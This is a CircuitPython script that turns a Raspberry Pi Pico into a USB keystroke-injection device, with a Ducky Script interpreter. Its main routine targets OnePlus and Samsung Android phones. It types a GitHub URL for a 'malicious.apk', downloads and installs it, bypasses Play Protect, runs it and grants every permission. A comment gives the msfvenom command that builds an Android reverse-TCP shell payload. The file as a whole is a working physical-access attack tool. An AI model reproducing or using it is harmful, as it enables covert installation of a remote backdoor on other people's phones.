import time
import digitalio
import usb_hid
import board

from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_sf import KeyboardLayout
from keycode_win_sf import Keycode

# Add keystroke Pico-Ducky Project
duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
"LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
"ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE",
"TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
" u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
" Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"]

keycodeCommands = [Keycode.WINDOWS, Keycode.GUI, Keycode.APPLICATION, Keycode.APPLICATION, Keycode.SHIFT, Keycode.ALT, Keycode.CONTROL,
Keycode.CONTROL, Keycode.DOWN_ARROW, Keycode.DOWN_ARROW ,Keycode.LEFT_ARROW, Keycode.LEFT_ARROW, Keycode.RIGHT_ARROW, Keycode.RIGHT_ARROW,
Keycode.UP_ARROW, Keycode.UP_ARROW, Keycode.PAUSE, Keycode.PAUSE, Keycode.CAPS_LOCK, Keycode.DELETE, Keycode.END, Keycode.ESCAPE,
Keycode.ESCAPE, Keycode.HOME, Keycode.INSERT, Keycode.KEYPAD_NUMLOCK, Keycode.PAGE_UP, Keycode.PAGE_DOWN, Keycode.PRINT_SCREEN,
Keycode.SCROLL_LOCK, Keycode.SPACE, Keycode.TAB, Keycode.ENTER, Keycode.A, Keycode.B, Keycode.C, Keycode.D, Keycode.E, Keycode.F, Keycode.G,
Keycode.H, Keycode.I, Keycode.J, Keycode.K, Keycode.L, Keycode.M, Keycode.N, Keycode.O, Keycode.P, Keycode.Q, Keycode.R, Keycode.S, Keycode.T,
Keycode.U, Keycode.V, Keycode.W, Keycode.X, Keycode.Y, Keycode.Z, Keycode.A, Keycode.B, Keycode.C, Keycode.D, Keycode.E, Keycode.F,
Keycode.G, Keycode.H, Keycode.I, Keycode.J, Keycode.K, Keycode.L, Keycode.M, Keycode.N, Keycode.O, Keycode.P,
Keycode.Q, Keycode.R, Keycode.S, Keycode.T, Keycode.U, Keycode.V, Keycode.W, Keycode.X, Keycode.Y, Keycode.Z,
Keycode.F1, Keycode.F2, Keycode.F3, Keycode.F4, Keycode.F5, Keycode.F6, Keycode.F7, Keycode.F8, Keycode.F9,
Keycode.F10, Keycode.F11, Keycode.F12]

# Add function Pico-Ducky Project
def convertLine(line):
    newline = []
    print(line)
    for j in range(len(keycodeCommands)):
		    if line.find(duckyCommands[j]) != -1:
		    	newline.append(keycodeCommands[j])
    print(newline)
    return newline

def runScriptLine(line):
    for k in line:
        keyboard.press(k)
    keyboard.release_all()

def sendString(line):
    layout.write(line)

def parseLine(line):
    if(line[0:3] == "REM"):
        # ignore ducky script comments
        pass
    elif(line[0:5] == "DELAY"):
        time.sleep(float(line[6:])/1000)
    elif(line[0:6] == "STRING"):
        sendString(line[7:])
    elif(line[0:13] == "DEFAULT_DELAY"):
        defaultDelay = int(line[14:]) * 10
    elif(line[0:12] == "DEFAULTDELAY"):
        defaultDelay = int(line[13:]) * 10
    else:
        newScriptLine = convertLine(line)
        runScriptLine(newScriptLine)


# Load Raspberry Pi Pico as HID Keyboard device
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# Load the default LED of the Raspberry Pi Pico
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# While wait if no pin connected
progStatus = False
progStatusPin = digitalio.DigitalInOut(board.GP0)
progStatusPin.switch_to_input(pull=digitalio.Pull.UP)
progStatus = not progStatusPin.value
defaultDelay = 0

OnePlusStatus = False
OnePlusStatusPin = digitalio.DigitalInOut(board.GP4)
OnePlusStatusPin.switch_to_input(pull=digitalio.Pull.UP)
OnePlusStatus = not OnePlusStatusPin.value

SamsungStatus = False
SamsungStatusPin = digitalio.DigitalInOut(board.GP5)
SamsungStatusPin.switch_to_input(pull=digitalio.Pull.UP)
SamsungStatus = not SamsungStatusPin.value

duckyStatus = False
duckyStatusPin = digitalio.DigitalInOut(board.GP6)
duckyStatusPin.switch_to_input(pull=digitalio.Pull.UP)
duckyStatus = not duckyStatusPin.value

while True:
    progStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    progStatus = not progStatusPin.value
    OnePlusStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    OnePlusStatus = not OnePlusStatusPin.value
    SamsungStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    SamsungStatus = not SamsungStatusPin.value
    duckyStatusPin.switch_to_input(pull=digitalio.Pull.UP)
    duckyStatus = not duckyStatusPin.value
    led.value = True
    time.sleep(0.5)
    led.value = False
    time.sleep(0.5)
    if SamsungStatus or OnePlusStatus or progStatus or duckyStatus is True:
        break

# Start the LED to show that the script is running.
led.value = True
time.sleep(3.0)

# Check GP0 for debug mode
if progStatus is False:
    # Check GP4 to select OnePlus7Pro Device
    if OnePlusStatus is True:
        device = "OP7P"
        OnePlus = ["OP7P", "OP8P"]
        OnePlusDevice = True
    else:
        OnePlusDevice = False

    # Check GP5 to Select Samsung Galaxy S9 Device
    if SamsungStatus is True:
        device = "SGS9E"
        Samsung = ["SGS9E"]
        SamsungDevice = True
    else:
        SamsungDevice = False

    # Check GP6 to Select Pico-Ducky Project
    if duckyStatus is True:
        duckyScriptPath = "payload.dd"
        f = open(duckyScriptPath,"r",encoding='utf-8')
        print("Running payload.dd")
        previousLine = ""
        duckyScript = f.readlines()
        for line in duckyScript:
            line = line.rstrip()
            if(line[0:6] == "REPEAT"):
                for i in range(int(line[7:])):
                    #repeat the last command
                    parseLine(previousLine)
                    time.sleep(float(defaultDelay)/1000)
            else:
                parseLine(line)
                previousLine = line
            time.sleep(float(defaultDelay)/1000)
        print("done")
        quit


    # Open browser with default shortcut
    keyboard.press(Keycode.GUI, Keycode.B)
    keyboard.release_all()
    time.sleep(0.5)

    # Open a new tab to reach the google search home page
    keyboard.press(Keycode.CONTROL, Keycode.T)
    keyboard.release_all()
    time.sleep(1.5)

    # Reach the search bar
    keyboard.press(Keycode.CONTROL, Keycode.L)
    keyboard.release_all()
    time.sleep(0.5)

    # Do you'r research
    # msfvenom -p android/shell/reverse_tcp LHOST=ip LPORT=port -f raw -o malicious.apk
    # TODO : Fix keyboard layout
    layout.write("httpsö--github.com-V0lk3n-HIDScripts-raw-main-Backdoor-malicious.apk")
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Open Chrome Menu
    keyboard.press(Keycode.ALT, Keycode.F)
    keyboard.release_all()
    time.sleep(0.5)

    # Select Download Menu
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Locate the downloaded malware on download page
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Open the malware to install it
    if OnePlusDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.0)
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        if device == "OP8P":
            keyboard.press(Keycode.TAB)
            keyboard.release_all()
            time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.5)
    elif SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(1.5)
    else:
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)

    # Force install once blocked by play protect
    if SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(2.5)

    # Run the malware
    if OnePlusDevice == True:
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(0.5)
    elif SamsungDevice == True:
        keyboard.press(Keycode.TAB)
        keyboard.release_all()
        time.sleep(0.5)
        keyboard.press(Keycode.ENTER)
        keyboard.release_all()
        time.sleep(0.5)
    else:
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)
        led.value = False
        time.sleep(1.0)
        led.value = True
        time.sleep(1.0)

    # Give all the permission to the malware
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Close Old App warning
    # TODO : Check how to avoid this
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Go to Home Screen with default keyboard shortcut
    keyboard.press(Keycode.GUI, Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)

    # Stop the LED to show that the script has ended.
    led.value = False
    time.sleep(0.5)
